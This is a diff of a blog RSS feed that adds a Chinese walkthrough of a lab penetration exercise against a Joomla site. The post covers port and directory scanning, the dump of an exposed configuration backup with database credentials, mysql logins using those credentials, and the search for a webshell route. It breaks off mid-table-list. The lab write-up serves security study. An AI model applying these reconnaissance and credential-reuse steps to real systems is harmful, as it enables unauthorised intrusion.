@@ -1,4 +1,528 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Oight</title><link>https://Oight.github.io/post/</link><description>Recent content in Posts on Oight</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Oight</copyright><lastBuildDate>Mon, 15 Jun 2026 10:31:09 +0800</lastBuildDate><atom:link href="https://Oight.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>红日靶场（一）渗透</title><link>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%97%E9%80%8F/</link><pubDate>Mon, 15 Jun 2026 10:31:09 +0800</pubDate><guid>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%97%E9%80%8F/</guid><description>&lt;h1 id="红日靶场一渗透">红日靶场（一）渗透
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Oight</title><link>https://Oight.github.io/post/</link><description>Recent content in Posts on Oight</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Oight</copyright><lastBuildDate>Sun, 21 Jun 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://Oight.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>红日靶场（三）渗透</title><link>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89%E6%B8%97%E9%80%8F/</link><pubDate>Sun, 21 Jun 2026 00:00:00 +0000</pubDate><guid>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89%E6%B8%97%E9%80%8F/</guid><description>&lt;h1 id="红日靶场三">红日靶场三
+&lt;/h1>&lt;h2 id="外围打点">外围打点
+&lt;/h2>&lt;p>进靶场首先拿到靶场IP &lt;code>192.168.111.20&lt;/code> 用nmap扫描开放的端口：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sS 192.168.111.20 -T4
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco2wlxfzj30rc09nn0l.jpg"
+loading="lazy"
+alt="image-20260620162825110"
+>&lt;/p>
+&lt;p>开放了22， 80 和3306，访问80看跑的是什么服务&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco2wde1oj31c50xewvb.jpg"
+loading="lazy"
+alt="image-20260620163013704"
+>&lt;/p>
+&lt;p>可以看到是用Joomla搭的CMS，有登录功能，尝试了常见的弱密码都无果，考虑用&lt;code>dirsearch&lt;/code>扫一下试试&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dirsearch -u 192.168.111.20
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco2vxg8hj30yx0ipqgn.jpg"
+loading="lazy"
+alt="image-20260620163246456"
+>&lt;/p>
+&lt;p>可以看到扫到了&lt;code>/configuration.php~&lt;/code>&lt;/p>
+&lt;p>&lt;code>configuration.php&lt;/code>文件是Joomla的配置文件，而&lt;code>configuration.php~&lt;/code> 文件是在编辑 &lt;code>configuration.php&lt;/code> 文件时产生的，它包含与原始 &lt;code>configuration.php&lt;/code> 完全相同的 PHP 源代码，其中可能包含数据库密码、API 密钥等敏感信息，Web 服务器通常不会将 &lt;code>.php~&lt;/code> 文件作为 PHP 脚本执行，而是会以纯文本形式直接输出其内容。这意味着，如果该文件位于网站可访问的目录下，攻击者可直接在浏览器中访问并查看所有配置信息。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//configuration.php~
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">JConfig&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$offline&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$offline_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;网站正在维护。&amp;lt;br /&amp;gt;请稍候访问。&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$display_offline_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$offline_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$sitename&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;test&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$editor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;tinymce&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$captcha&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$list_limit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;20&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$access&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$debug&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$debug_lang&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$debug_lang_const&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$dbtype&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;mysqli&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;testuser&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;cvcvgjASD!@&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;joomla&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$dbprefix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;am2zu_&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$live_site&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;gXN9Wbpk7ef3A4Ys&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$gzip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$error_reporting&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;default&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$helpurl&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&amp;amp;amp;lang={langcode}&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$ftp_host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$ftp_port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$ftp_user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$ftp_pass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$ftp_root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$ftp_enable&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;UTC&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$mailonline&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$mailer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;mail&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$mailfrom&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;test@test.com&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$fromname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;test&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$sendmail&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/usr/sbin/sendmail&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$smtpauth&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$smtpuser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$smtppass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$smtphost&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$smtpsecure&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;none&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$smtpport&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;25&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$caching&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$cache_handler&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;file&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$cachetime&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;15&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$cache_platformprefix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$MetaDesc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$MetaKeys&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$MetaTitle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$MetaAuthor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$MetaVersion&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$robots&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$sef&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$sef_rewrite&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$sef_suffix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$unicodeslugs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$feed_limit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;10&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$feed_email&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;none&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$log_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/var/www/html/administrator/logs&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$tmp_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/var/www/html/tmp&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$lifetime&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;15&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$session_handler&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;database&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="nv">$shared_session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到这里使用的是mySQL，用户名是&lt;code>testuser&lt;/code>,密码&lt;code>cvcvgjASD!@&lt;/code>&lt;/p>
+&lt;p>用用户名密码可以登录数据库&lt;/p>
+&lt;p>可以使用&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mysql -h 192.168.111.20 -u testuser -p
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>来登录远程数据库，这里报错&lt;code>ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it&lt;/code>的原因是目标服务器的 MySQL 服务没有开启或支持 SSL，导致客户端拒绝建立不安全的连接。所以需要加上&lt;code>--skip-ssl&lt;/code>参数来临时禁用SSL&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mysql -h 192.168.111.20 -u testuser -P &lt;span class="m">3306&lt;/span> -p --skip-ssl
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco2vmmfxj30sl09dgpf.jpg"
+loading="lazy"
+alt="image-20260620164259433"
+>&lt;/p>
+&lt;p>登录之后先查数据库 &lt;code>show databases;&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco2vgvznj30c508cab9.jpg"
+loading="lazy"
+alt="image-20260620164504281"
+>&lt;/p>
+&lt;p>查看权限 &lt;code>SHOW GRANTS;&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco2vbfs3j30lr083ac9.jpg"
+loading="lazy"
+alt="image-20260620164617740"
+>&lt;/p>
+&lt;p>只对 &lt;code>joomla&lt;/code>有完整权限，由于没有全局root，导致不能使用常规的方法（比如向日志中写webshell）来写webshell&lt;/p>
+&lt;p>所以考虑其他思路获取webshell&lt;/p>
+&lt;p>先翻下数据库&lt;/p>
+&lt;p>&lt;code>use joomla;&lt;/code> 切换到 &lt;code>joomla&lt;/code> 表，然后&lt;code>show tables;&lt;/code>查表&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco2v44c1j30qf0ka0yn.jpg"
+loading="lazy"
+alt="image-20260620165124435"
+>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">+-------------------------------+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Tables_in_joomla &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-------------------------------+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_action_log_config &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_action_logs &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_action_logs_extensions &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_action_logs_users &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_assets &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_associations &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_banner_clients &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_banner_tracks &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_banners &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_categories &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_contact_details &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_content &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_content_frontpage &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_content_rating &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_content_types &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_contentitem_tag_map &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_core_log_searches &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_extensions &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_fields &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_fields_categories &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_fields_groups &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_fields_values &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_filters &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms0 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms1 &lt;span class="p">|&lt;/span>
